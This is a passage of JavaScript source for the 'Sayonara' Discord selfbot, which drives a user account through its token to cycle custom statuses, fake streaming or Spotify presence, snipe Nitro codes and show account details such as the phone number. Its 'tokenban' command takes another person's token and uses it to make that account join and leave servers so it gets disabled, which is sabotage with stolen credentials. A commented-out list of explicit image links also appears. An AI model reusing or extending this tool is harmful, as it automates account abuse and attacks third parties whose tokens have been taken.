            DoNotif("```Be sure using a Nitro for using custom emojis. ✅```")

            message.channel.send("https://discord.gg/kokoro")
            message.channel.send("https://discord.gg/KmxfPT6")
            message.channel.send("https://discord.gg/grQgE8PRp3")

            if (!interval) 
            {
                interval = setInterval(() => 
                {
                    let axiosConfig = 
                    {
                        headers: 
                        {
                            'content-type': 'application/json',
                            'authorization': token
                        }
                    };

                    let data = {};
                    let emojiname;

                    let id_list = ["728357360380411956", "729058729798139984", "728355692393660559", "490625001758654468", "490625132876922921", "752000372456816743", "751998853351211099", "751998853351211099", "490625133103284236", "666655515316584449", "758490063700492359", "714706347161288724", "654140064950910989", "654145294216462346", "752000254689280063", "705396227801350174", "638554933553266718", "638555053673938974", "728369920206962729"]

                    var emoji_id = id_list[Math.floor(Math.random() * id_list.length)];

                    if (emoji_id === "728357360380411956") {
                        let emojiname = "EmiDealWithIt";
                    } else if (emoji_id === "729058729798139984") {
                        emojiname = "EmiDrunk";
                    } else if (emoji_id === "728355692393660559") {
                        emojiname = "EmiPeekabo";
                    } else if (emoji_id === "490625001758654468") {
                        emojiname = "EmiPuck";
                    } else if (emoji_id === "490625132876922921") {
                        emojiname = "EmiRee";
                    } else if (emoji_id === "752000372456816743") {
                        emojiname = "EmiReee";
                    } else if (emoji_id === "751998853351211099") {
                        emojiname = "EmiSalute";
                    } else if (emoji_id === "490625133103284236") {
                        emojiname = "EmiSmirk";
                    } else if (emoji_id === "666655515316584449") {
                        emojiname = "EmiSpook";
                    } else if (emoji_id === "758490063700492359") {
                        emojiname = "EmiYandere";
                    } else if (emoji_id === "714706347161288724") {
                        emojiname = "EmiliaGiggle";
                    } else if (emoji_id === "654140064950910989") {
                        emojiname = "EmiliaHmm2";
                    } else if (emoji_id === "654145294216462346") {
                        emojiname = "EmiliaSmug";
                    } else if (emoji_id === "752000254689280063") {
                        emojiname = "Emiumu";
                    } else if (emoji_id === "705396227801350174") {
                        emojiname = "AG_EmiConcern";
                    } else if (emoji_id === "638554933553266718") {
                        emojiname = "KREmiHmph";
                    } else if (emoji_id === "638555053673938974") {
                        emojiname = "KREmiPout";
                    } else if (emoji_id === "728369920206962729") {
                        emojiname = "DonaTurn";
                    }

                    //By Default
                    //data.text = "";
                    //data.emoji_name = "KREmiliaRee";
                    //data.emoji_id = "638554828309659658";

                    data.text = ""; //Text empty
                    data.emoji_name = emoji_id;
                    data.emoji_id = emoji_id;
                    axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, JSON.stringify({
                        custom_status: data
                    }), axiosConfig)
                }, 5000);
            } else {
                message.channel.send('a loop is already running');
            };

            DoNotif("```MultiStatus started ✅ for stop it type " + prefix + "multistatus stop```");
        }

        if (cmd === "stream") 
        {
            message.delete()
            client.user.setPresence({
                game: {
                    name: `${args.join(" ")}`,
                    type: "STREAMING",
                    url: "https://twitch.tv/monstercat"
                }
            });

            let cmdList = new Discord.RichEmbed()

                .setDescription("** " + random_emojis + "「𝙎𝙏𝙍𝙀𝘼𝙈𝙄𝙉𝙂 𝙎𝙏𝘼𝙏𝙐𝙎」" + random_emojis + " **")
                .setColor(color)
                .addField("**Your activity is now changed to : ** " + args.join("") + "", "**Everybody will see your status to purple. for stop streaming type " + prefix + "stopstream**")
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(cmdList)
        }

        if (cmd === "multistream")
        {
            message.delete()
            setInterval(function() 
            {
                client.user.setActivity(MULTISTEAM[Math.floor(Math.random() * MULTISTEAM.length)], 
                {
                    type: "STREAMING",
                    url: "https://twitch.tv/monstercat"
                });
            }, 5000);
        }

        if (cmd === "stopstream") 
        {
            client.user.setPresence({
                game: {
                    name: `this`,
                    type: " ",
                    url: "this"
                }
            });

            return DoNotif("``Streaming successfully stopped. ✅```")
        }

        if (cmd === "spotify") 
        {
            var largeimg = "spotify:ab67616d0000b273d14938188f84670b61137dbd";
            var smallimg = "spotify:ab67616d000048514583f97464d6d2fbf1db5752";

            let msg = args.slice(0).join(" ");
            message.delete()

            let spotistate = rpcGenerator.createSpotifyRpc(client)
                .setAssetsLargeImage(largeimg)
                .setAssetsSmallImage(smallimg)
                .setDetails(msg)
                .setState('Sayonara Selfbot')
                .setStartTimestamp(Date.now())
                .setEndTimestamp(Date.now() + 86400000);

            client.user.setPresence(spotistate.toDiscord());
            DoNotif("```Spotify status enabled on your account. ✅```")
        }

        if (cmd === "customspotify") 
        {
            var largeimg = "";
            var smallimg = "";
            let endtime = 0;

            largeimg = "spotify:" + args[0];
            smallimg = "spotify:" + args[1];
            endtime = args[2];
            let msg = args.slice(3).join(" ");

            message.delete()

            let spotistate = rpcGenerator.createSpotifyRpc(client)
                .setAssetsLargeImage(largeimg)
                .setAssetsSmallImage(smallimg)
                .setDetails(msg)
                .setState('Sayonara Selfbot')
                .setStartTimestamp(Date.now())
                .setEndTimestamp(Date.now() + Number(endtime));

            client.user.setPresence(spotistate.toDiscord());
            DoNotif("```Custom Spotify status enabled on your account. ✅```")
        }

        if (cmd === "statustime") 
        {
            let amsg = args[0];
            message.delete()

            if (amsg === "stop") 
            {
                clearInterval(interval);
                interval = undefined;
                return DoNotif("```statustime has been stopped. ✅```");
            }

            if (!interval) 
            {
                interval = setInterval(() => 
                {
                    let now = new Date();
                    var timer = now.toLocaleTimeString('en-US');
                    let data = {};
                    data.text = timer;
                    data.emoji_name = "🕥";
                    //data.emoji_id = "638554828309659658";

                    let axiosConfig = {
                        headers: {
                            'content-type': 'application/json',
                            'authorization': token
                        }
                    };
                    axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, JSON.stringify({
                        custom_status: data
                    }), axiosConfig)
                }, 5000);
            } else {
                message.channel.send('a loop is already running');
            };

            let cmdList = new Discord.RichEmbed()

                .setDescription("** " + random_emojis + "「𝙎𝙏𝘼𝙏𝙐𝙎 𝙏𝙄𝙈𝙀」" + random_emojis + " **")
                .setColor(color)
                .addField("**Your activity is now changed", "**Everybody will see your status, with the actual time. for stop it type " + prefix + "statustime stop**")
                .setImage(image)
                  .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(cmdList)
        }

        if (cmd == "mediastatus") 
        {
            let amsg = args[0];
            message.delete()
        
            if (amsg === "stop") 
            {
                clearInterval(interval);
                interval = undefined;
                return DoNotif("```statustime has been stopped. ✅```");
            }
        
            if (!interval) 
            {
                interval = setInterval(() => 
                {
                    var random_media_status = ["🔘▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬🔘▬▬▬▬▬▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬🔘▬▬▬▬▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬▬🔘▬▬▬▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬▬▬🔘▬▬▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬▬▬▬🔘▬▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬▬▬▬▬🔘▬▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬▬▬▬▬▬🔘▬▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬▬▬▬▬▬▬🔘▬▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬▬▬▬▬▬▬▬🔘▬▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬▬▬▬▬▬▬▬▬🔘▬▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬▬▬▬▬▬▬▬▬▬🔘▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬▬▬▬▬▬▬▬▬▬▬🔘▬▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬▬▬▬▬▬▬▬▬▬▬▬🔘▬ ⇆　　◁　　❚❚　　▷　　↻", "▬▬▬▬▬▬▬▬▬▬▬▬▬▬🔘 ⇆　　◁　　❚❚　　▷　　↻"][Math.floor(Math.random() * 15)] 

                    let data = {};
                    data.text = random_media_status
                    data.emoji_name = "🎶";
        
                    let axiosConfig = 
                    {
                        headers: 
                        {
                            'content-type': 'application/json',
                            'authorization': token
                        }
                    };
                    axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, JSON.stringify({
                        custom_status: data
                    }), axiosConfig)
                }, 5000);
            } 
            else 
            {
                message.channel.send('a loop is already running');
            };
        
            let cmdList = new Discord.RichEmbed()
        
                .setDescription("** " + random_emojis + "「𝙈𝙚𝙙𝙞𝙖 𝙎𝙩𝙖𝙩𝙪𝙨」" + random_emojis + " **")
                .setColor(color)
                .addField("***Your activity is now changed***", "**Everybody will see your custom status, moving like a media spotify. for stop it type " + prefix + "mediastatus stop**")
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
        
            message.channel.send(cmdList)
        }

        if (cmd === "hentaistatus")
        {
            message.delete()
            var rdm_emojis = ['🍁', '🌲', '☄️', '⚡️', '❄️', '🔥', '🌪', '🌸', '🌹', '🍣', '🧃', '🌌', '💊', '💉', '🩸', '🔪', '🧸', '🎀', '❤️', '🔰', '🩹'][Math.floor(Math.random() * 20)]
            var random_img = ['sayo1', 'sayo2', 'sayo3', 'sayo4', 'sayo5', 'sayo6', 'sayo7', 'sayo8', 'sayo9', "sayo10", "sayo11", "sayo12", "sayo13", "sayo14", "sayo15", "sayo16", "sayo17", "sayo18", "sayo19"][Math.floor(Math.random() * 19)] 
            var uuid = () => ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, a => (a ^ Math.random() * 16 >> a / 4).toString(16));

            rpcGenerator.getRpcImage("841650211829973003", random_img).then(image => 
            {
                let presence = new rpcGenerator.Rpc()
                .setName(`𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖 𝙎𝙚𝙡𝙛𝙗𝙤𝙩`)
                .setUrl("https://twitch.tv/misakiii_")
                .setType("STREAMING")
                .setApplicationId("841650211829973003")
                .setAssetsLargeImage(image.id)
                .setAssetsLargeText(`discord.gg/ZwdVgCkMt2`)
                .setDetails("𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖 𝙎𝙚𝙡𝙛𝙗𝙤𝙩")
                .setState(`Hentaii ` + rdm_emojis)
                .setParty({ size: [1, 666], id: uuid()})
                    
            client.user.setPresence(presence.toDiscord())}).catch(consolelog("error", "Something is wrong with the settings of SayoState."))

            return DoNotif("```Hentai status has been added. ✅```");
        }

        if (cmd === "resetstatus") 
        {
            message.delete()
            client.user.setActivity(null, {});

            let data = {}; data.text = ""; //data.emoji_name = ""; data.emoji_id = "";
            let axiosConfig = { headers: { 'content-type': 'application/json', 'authorization': token } };
            axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, JSON.stringify({ custom_status: data }), axiosConfig)
            return DoNotif(language.STATUSRESET)
        }

        //#endregion



        //#region > SETTINGS MENU & OPTIONS

        if (cmd === "settings") 
        {
            message.delete()

            const help = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙎𝙚𝙩𝙩𝙞𝙣𝙜𝙨」" + random_emojis + " <<」**")
                .setThumbnail(client.user.displayAvatarURL)
                .setColor(color)
                .addField("**```" + prefix + "sayoinfos ```**", `***${language.SAYOINFOS_DESC}.***`)
                .addField("**```" + prefix + "adblock ```**", `***${language.ADBLOCK_DESC}.***`)
                .addField("**```" + prefix + "afk ```**", `***${language.AFK_DESC}.***`)
                .addField("**```" + prefix + "report ```**", `***${language.REPORT_DESC}.***`)
                .addField("**```" + prefix + "nitrosniper ```**", `***${language.NITROSNIPER_DESC}.***`)
                .addField("**```" + prefix + "setprefix + TEXT ```**", `***${language.PREFIX_DESC}.***`)
                .addField("**```" + prefix + "setimage + LINK ```**", `***${language.CUSTOMIMAGE_DESC}.***`)
                .addField("**```" + prefix + "setcolor + TEXT ```**", `***${language.CUSTOMCOLOR}.***`)
                .addField("**```" + prefix + "sayostate ```**", `***${language.SAYOSTATE}.***`)
                .addField("**```" + prefix + "setdark ```**", `***${language.DARKMODE_DESC}.***`)
                .addField("**```" + prefix + "setlight ```**", `***${language.LIGHTMODE_DESC}.***`)
                .addField("**```" + prefix + "clear ```**", `***${language.CLEAR_DESC}.***`)
                .addField("**```" + prefix + "autoread ```**", `***${language.AUTOREAD_DESC}.***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(help)
            consolelog("information", `${language.DEBUG_LOGS_SETTINGS_SEND}.`)
        }

        if (cmd === "sayoinfos") 
        {
            message.delete()
            let cpuLol;
            cpuStat.usagePercent(function(err, percent, seconds) 
            {

                const { version } = require("misakiii-discordjs");

                request({uri: `https://discord.com/api/${Discord_Version}/users/@me`, headers: {'Content-Type': 'application/json', Authorization: token}, json: true, method: "GET"}, function(err, response, status) {
                    var reponseme = response.body;
                    
                request({uri: `https://discord.com/api/${Discord_Version}/users/@me/settings`, headers: {'Content-Type': 'application/json', Authorization: token}, json: true, method: "GET"}, function(err, response, status) {
                    var reponsemesettings = response.body;

                        let date = new Date(null);
                        date.setMilliseconds(client.uptime);
                        let hours = date.toISOString().substr(11, 2);
                        let minutes = date.toISOString().substr(14, 2);
                        let second = date.toISOString().substr(17, 2);
        
                        var embed = new Discord.RichEmbed()
                            .setTitle("**「>> " + random_emojis + "「𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖 𝙄𝙣𝙛𝙤𝙨」" + random_emojis + " <<」**")
                            .setThumbnail(client.user.displayAvatarURL)
                            .addField('*** 🔒 Username: ***', `${client.user.username}`)
                            .addField('*** 📌 Version: ***', `${SayoVersion}`)
                            .addField('*** 📎 Prefix: ***', `${prefix}`)
                            .addField('*** 🛡️ 2AF: ***', `${reponseme.mfa_enabled}`)
                            .addField('*** 📞 Phone Number: ***', `${reponseme.phone}`)
                            .addField('*** 📜 Channels: ***', `${client.channels.size}`)
                            .addField('*** 👥 Friends: ***', `${client.user.friends.size}`)
                            .addField('*** 🗄️ Servers: ***', `${client.guilds.size}`)
                            .addField('*** ✉️ Email Verified: ***', `${client.user.verified}`)
                            .addField('*** 💻 Users: ***', `${client.guilds.map(guild => guild.memberCount).reduce((a, b) => a + b)}`)
                            .addField('*** 📊 Memory Usage (Ram): *** ', `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} / ${(os.totalmem() / 1024 / 1024).toFixed(2)} MB`)
                            .addField("*** ⚙️ Arch: ***", `${process.arch}`)
                            .addField("*** 🔒 Version Node: ***", `${process.version}`)
                            .addField("*** 🔒 Misakiii.js: ***", `v${version}`)
                            .addField("*** 🎛️ CPU: ***", `${os.cpus().map(i => `${i.model}`)[0]}`)
                            .addField("*** 📈 CPU usage: ***", `${percent.toFixed(2)}%`)
                            .addField('*** ⌚ Uptime: ***', `${hours} Hours | ${minutes} Minutes | ${second} Seconds`)
                            .setImage(image)
                            .setColor(color)
                            .setThumbnail(message.author.avatarURL)
                            .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
                            .setTimestamp()
                        message.channel.send(embed)
                    })
                })
            })
        }

        if (cmd === "adblock") 
        {
            if (adblock_mode === "off") 
            {
                adblock_mode = "on";
                message.delete()
                DoNotif("```Adblock mode enabled. ✅```")
            } 
            else
            {
                adblock_mode = "off";
                message.delete()
                return DoNotif("```Adblock mode disabled. ❌```");
            }
        }

        if (cmd === "afk") 
        {
            let msg = args.slice(0).join(" ");

            if (msg)
            {
                afkmessage = msg;
                message.delete()
                return DoNotif("```New AFK message has been set to: " + msg + " ✅```")
            }

            if (afk_mode === "off") 
            {
                afk_mode = "on";
                message.delete()
                DoNotif("```AFK mode enabled. ✅```")
                DoNotif("```If you want to change the AFK message, do /afk (your message). ✅```")
            } 
            else
            {
                afk_mode = "off";
                message.delete()
                return DoNotif("```AFK mode disabled. ❌```");
            }
        }

        if (cmd === "report") 
        {
            if (report_mode === "off") 
            {
                report_mode = "on";
                message.delete()
                DoNotif("```Report mode enabled. ✅```")
            } 
            else 
            {
                report_mode = "off";
                message.delete()
                return DoNotif("```Report mode disabled. ❌```")
            }
        }

        if (cmd === "nitrosniper") 
        {
            if (nitro_sniper === "off") 
            {
                nitro_sniper = "on";
                message.delete()
                DoNotif("```Nitro Sniper enabled. ✅```")
            } 
            else 
            {
                nitro_sniper = "off";
                message.delete()
                return DoNotif("```Nitro Sniper disabled. ❌```")
            }
        }

        if (cmd === "setprefix") 
        {
            message.delete()
            let newprefix = message.content.split(" ")[1]
            if (!newprefix) return DoNotif("```Please enter a new prefix. ❌```");
            prefix = newprefix;
            return DoNotif("```New prefix has been set: " + newprefix + " ✅```")
        }

        if (cmd === "setimage") 
        {
            message.delete()
            let newimage = message.content.split(" ")[1]
            if (!newimage) return DoNotif("```Please enter a new image. ❌```");
            image = newimage;
            return DoNotif("```New image has been set: " + newimage + " ✅```")
        }

        if (cmd === "setcolor") 
        {
            message.delete()
            let newcolor = message.content.split(" ")[1]
            if (!newcolor) return DoNotif("```Please enter a new color. ❌```");
            color = newcolor;
            return DoNotif("```New color has been set: " + newcolor + " ✅```")
        }

        if (cmd === "sayostate") 
        {
            if (sayostate === "true") 
            {
                sayostate = "false";
                message.delete()
                DoNotif("```Sayonara Status has been removed. ❌```")
                client.user.setActivity("", {
                    type: ""
                });
            } 
            else
            {
                sayostate = "true";
                message.delete()
                DoNotif("```Sayonara Status has been added. ✅```")

                var rdm_emojis = ['🍁', '🌲', '☄️', '⚡️', '❄️', '🔥', '🌪', '🌸', '🌹', '🍣', '🧃', '🌌', '💊', '💉', '🩸', '🔪', '🧸', '🎀', '❤️', '🔰', '🩹'][Math.floor(Math.random() * 20)]
                var random_img = ['sayo1', 'sayo2', 'sayo3', 'sayo4', 'sayo5', 'sayo6', 'sayo7', 'sayo8', 'sayo9', "sayo10", "sayo11", "sayo12", "sayo13", "sayo14", "sayo15", "sayo16", "sayo17", "sayo18"][Math.floor(Math.random() * 18)] 
                var uuid = () => ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, a => (a ^ Math.random() * 16 >> a / 4).toString(16));

                rpcGenerator.getRpcImage("841645044486242345", rdm_images).then(image => 
                {
                    let presence = new rpcGenerator.Rpc()
                    .setName(`𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖 𝙎𝙚𝙡𝙛𝙗𝙤𝙩`)
                    .setUrl("https://twitch.tv/misakiii_")
                    .setType("STREAMING")
                    .setApplicationId("841645044486242345")
                    .setAssetsLargeImage(image.id)
                    .setAssetsLargeText(`discord.gg/ZwdVgCkMt2`)
                    .setDetails("𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖 𝙎𝙚𝙡𝙛𝙗𝙤𝙩")
                    .setState(`𝙎𝙖𝙮𝙤𝙣𝙖𝙧𝙖 ${premium_text}` + rdm_emojis)
                    .setParty({ size: [1, 666], id: uuid()})
                        
                client.user.setPresence(presence.toDiscord())}).catch(consolelog("error", "Something is wrong with the settings of SayoState."))
            }
        }

        if (cmd === "setdark")
        {
            message.delete()

            var postData6 = { theme: "dark" }; let axiosConfig6 = { headers: { 'content-type': 'application/json', 'authorization': token } };
            axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, postData6, axiosConfig6).catch(err => {})

            DoNotif(language.DARKMODE_SET)
        }
        
        if (cmd === "setlight")
        {
            message.delete()

            var postData6 = { theme: "light" }; let axiosConfig6 = { headers: { 'content-type': 'application/json', 'authorization': token } };
            axios.patch(`https://discord.com/api/${Discord_Version}/users/@me/settings`, postData6, axiosConfig6).catch(err => {})

            DoNotif(language.LIGHTMODE_SET)
        }

        if (cmd === "clear")
        {
            message.delete()
            
            console.clear()

            request({uri: `https://discord.com/api/${Discord_Version}/users/@me`, headers: {'Content-Type': 'application/json', Authorization: token}, json: true, method: "GET"}, function(err, response, status) {
            var reponseme = response.body;
            
            request({uri: `https://discord.com/api/${Discord_Version}/users/@me/settings`, headers: {'Content-Type': 'application/json', Authorization: token}, json: true, method: "GET"}, function(err, response, status) {
            var reponsemesettings = response.body;
        

            console.log("\x1b[35m [Sayonara Infos]: \x1b[41m\x1b[37mSayonara is no way responsible for any bans you can get \x1b[40m")
            console.log("\x1b[35m [Sayonara Infos]: \x1b[41m\x1b[37mSayonara dont save any logs/token all is safe enjoy using my selfbot! \x1b[40m")
            console.log(gradient.morning(`  
    ██████  ▄▄▄     ▓██   ██▓ ▒█████   ███▄    █  ▄▄▄       ██▀███   ▄▄▄      
  ▒██    ▒ ▒████▄    ▒██  ██▒▒██▒  ██▒ ██ ▀█   █ ▒████▄    ▓██ ▒ ██▒▒████▄    
  ░ ▓██▄   ▒██  ▀█▄   ▒██ ██░▒██░  ██▒▓██  ▀█ ██▒▒██  ▀█▄  ▓██ ░▄█ ▒▒██  ▀█▄  
    ▒   ██▒░██▄▄▄▄██  ░ ▐██▓░▒██   ██░▓██▒  ▐▌██▒░██▄▄▄▄██ ▒██▀▀█▄  ░██▄▄▄▄██ 
  ▒██████▒▒ ▓█   ▓██▒ ░ ██▒▓░░ ████▓▒░▒██░   ▓██░ ▓█   ▓██▒░██▓ ▒██▒ ▓█   ▓██▒
  ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░  ██▒▒▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░
  ░ ░▒  ░ ░  ▒   ▒▒ ░▓██ ░▒░   ░ ▒ ▒░ ░ ░░   ░ ▒░  ▒   ▒▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░
  ░  ░  ░    ░   ▒   ▒ ▒ ░░  ░ ░ ░ ▒     ░   ░ ░   ░   ▒     ░░   ░   ░   ▒   
        ░        ░  ░░ ░         ░ ░           ░       ░  ░   ░           ░  ░
                     ░ ░                                                      `))
            console.log(`\x1b[31m                       Now Everyone Can Be Happy \x1b[37m`)
            console.log(``)
            console.log(gradient.passion(`                ${language.WELCOME_MSG1}`))
            console.log(gradient.passion(`══════════════════════════════════════════════════════════════`))
            console.log(gradient.passion(`| > Username: ${client.user.tag}`))
            console.log(gradient.passion(`| > ID: ${client.user.id}`))
            console.log(gradient.passion(`| > Server: ${client.guilds.size}`))
            console.log(gradient.passion(`| > Channel: ${client.channels.size}`))
            console.log(gradient.passion(`| > Friends: ${client.user.friends.size}`))
            console.log(gradient.passion(`| > Flags: ${reponseme.public_flags}`))
            console.log(gradient.passion(`| > Theme: ${reponsemesettings.theme}`))
            console.log(gradient.passion(`| > 2FA: ${reponseme.mfa_enabled}`))
            console.log(gradient.passion(`| > Game Activity: ${reponsemesettings.show_current_game}`))
            console.log(gradient.passion(`| > Language: ${reponsemesettings.locale}`))
            console.log(gradient.passion(`| > Number: ${client.user.mobile}`))
            console.log(gradient.passion(`| > Nitro: ${client.user.premium}`))
            console.log(gradient.passion(`| > Premium: ${premium_user}`))
            console.log(gradient.passion(`| > Prefix: ${prefix}`))
            console.log(gradient.passion(`══════════════════════════════════════════════════════════════`))
            console.log(gradient.passion(`              ${language.WELCOME_HOW_TO_USE}`))
            console.log(gradient.passion(``))
        })})
        }

        if (cmd === "autoread")
        {
            if (autoread === "off") 
            {
                autoread = "on";
                message.delete()
                DoNotif("```Auto Read mode enabled. ✅```")
            } 
            else 
            {
                autoread = "off";
                message.delete()
                return DoNotif("```Auto Read mode disabled. ❌```")
            }
        }

        //#endregion



        //#region > CREDITS MENU & OPTIONS

        if (cmd === "credits") 
        {
            message.delete()

            const credit = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝘾𝙧𝙚𝙙𝙞𝙩𝙨」" + random_emojis + " <<」**")
                .setDescription('```       discord.gg/ZwdVgCkMt2```')
                .setThumbnail(client.user.displayAvatarURL)
                .setColor(color)
                .addField("```𝘾𝙧𝙚𝙖𝙩𝙤𝙧:```", "***Misakiii***")
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(credit)
            consolelog("information", `${language.DEBUG_LOGS_CREDITS_SEND}.`)
        }

        //#endregion


        
        //#region > BACKUP MENU & OPTIONS

        if (cmd === "backups") 
        {
            message.delete()
        
            const credit = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝘽𝙖𝙘𝙠𝙪𝙥𝙨」" + random_emojis + " <<」**")
                .setThumbnail(client.user.displayAvatarURL)
                .setColor(color)
                .addField("**```" + prefix + "backupfriends ```**", `***${language.BACKUPFRIENDS_DESC}.***`)
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)
        
            message.channel.send(credit)
            consolelog("information", `${language.DEBUG_LOGS_BACKUPS_SEND}.`)
        }

        if (cmd === "backupfriends")
        {
            fs.readFile('./utility/backups-friends.json', 'utf8', function (err,data) 
            {
                var friendCount = client.user.friends.size
                const friends = client.user.friends.array()

                let friend = 
                {
                    BACKUP_FRIENDS: `${friends}`
                };

                let send = JSON.stringify(friend);
                fs.writeFile('./utility/backups-friends.json', send, 'utf8', function (err) 
                {
                    if (err) return console.log(err);
                });
            });
        }
        
        //#endregion
        


        //#region > PREMIUM MENU & OPTIONS

        if (premium_user === "true") 
        {
            if (cmd === "premium") 
            {
                message.delete()

                const premium = new Discord.RichEmbed()
                    .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙋𝙧𝙚𝙢𝙞𝙪𝙢」" + random_emojis + " <<」**")
                    .setThumbnail(client.user.displayAvatarURL)
                    .setColor(color)
                    .addField("**```" + prefix + "whitelist + USERID ```**", `***${language.WHITELIST_DESC}.***`)
                    .addField("**```" + prefix + "removewhitelist ```**", `***${language.REMOVEWHITELIST_DESC}.***`)
                    .addField("**```" + prefix + "tokenban + TOKEN ```**", `***${language.BANACC}***`)
                    .setImage(image)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

                message.channel.send(premium)
                consolelog("information", `${language.DEBUG_LOGS_PREMIUM_SEND}.`)
            }

            if (cmd === "whitelist") 
            {
                let USERID = args[0];
                message.delete()
                if (!USERID) return DoNotif("```Please, enter ID of the user you want to whitelist. ❌```");
                whitelistID = USERID;
                DoNotif("```User is now whitelisted, type /help ✅```")
            }

            if (cmd === "removewhitelist") 
            {
                message.delete()
                whitelistID = null;
                DoNotif("```Your friends was removed from whitelist ! ✅```")
            }

            if (cmd === "tokenban") 
            {
                //var random_avatar = ['https://ci.phncdn.com/videos/201912/20/270153041/original/(m=eaAaGwObaaaa)(mh=BPHFQV2xt4vCYdOB)8.jpg', 'https://g5e9h4s2.rocketcdn.me/wp-content/uploads/2019/07/Top_10_animes_hentai_2018.jpg', 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQTaqwIfTCPDQtMX6DT0ttw9Brhs_P0KKPOEw&usqp=CAU', 'https://fi1.ypncdn.com/201902/27/15194685/original/100/cum4k-meaty-pussy-filled-up-with-multiple-oozing-creampies-100(m=eaAaaEPbaaaa).jpg', 'https://ei.phncdn.com/videos/201709/12/132500831/original/(m=eaAaGwObaaaa)(mh=BQBZraJQPFhyZq1A)13.jpg'][Math.floor(Math.random() * 5)]
                let VICTIM = args[0];
                message.delete()
                if (!VICTIM) return DoNotif("```Please, enter the tokens of someone you want to ban from Discord. ❌```");

                function joinguildspatch(invite) 
                {
                    var postData = { }; let axiosConfig = { headers: { 'content-type': 'application/json', 'authorization': VICTIM } };
                    axios.post("https://discordapp.com/api/v6/invites/" + invite, postData, axiosConfig).catch(console.log(""))
                }

                function leaveaguild(id) 
                {
                    var postData = { }; let axiosConfig = { headers: { 'content-type': 'application/json', 'authorization': VICTIM } };
                    axios.delete("https://discord.com/api/v6/users/@me/guilds/" + id, postData, axiosConfig).catch(console.log(""))
                }

                joinguildspatch("kokoro"); //join the server with the acc
                leaveaguild("596934529927741442"); //leave the server with the acc

                DoNotif("```Account will be disabled in a few seconds. ✅```")
                consolelog("information", "the token " + VICTIM + " will be banned from Discord !")
                consolelog("good", "The account has been disabled.")
            }
        } 
        else 
        {
            //YOU ARE NOT A PREMIUM USER
            if (cmd === "premium") 
            {
                message.delete()

                const premium = new Discord.RichEmbed()
                    .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙋𝙧𝙚𝙢𝙞𝙪𝙢」" + random_emojis + " <<」**")
                    .setThumbnail(client.user.displayAvatarURL)
                    .setColor(color)
                    .addField("**Sorry**", "***you are not whitelised ❌***")
                    .setImage(image)
                    .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

                message.channel.send(premium)
            }
        }
    }

    if (message.author.id === whitelistID) 
    {

        //#region > HELP OPTIONS WHITELIST

        if (cmd === "help") 
        {
            const help = new Discord.RichEmbed()
                .setTitle("**「>> " + random_emojis + "「𝙈𝙚𝙣𝙪 𝙃𝙚𝙡𝙥 𝙒𝙝𝙞𝙩𝙚𝙡𝙞𝙨𝙩」" + random_emojis + " <<」**")
                .setColor(color)
                .setDescription('```         Welcome to Sayonara Whitelisted```')
                .addField("**```" + prefix + "fun ```**", "***Commands For Fun. 😂***")
                .addField("**```" + prefix + "nsfw ```**", "***Commands For NSFW. 🔞***")
                .setImage(image)
                .setFooter(`🌸 ${Project_Name} | Made By Misakiii 🌸`, image)

            message.channel.send(help)
            consolelog("information", `Whitelised User, ${language.DEBUG_LOG_HELP_SEND}`)
        }

        //#endregion

        
        //#region > FUN OPTIONS WHITELIST


        if (cmd === "fun") 
        {
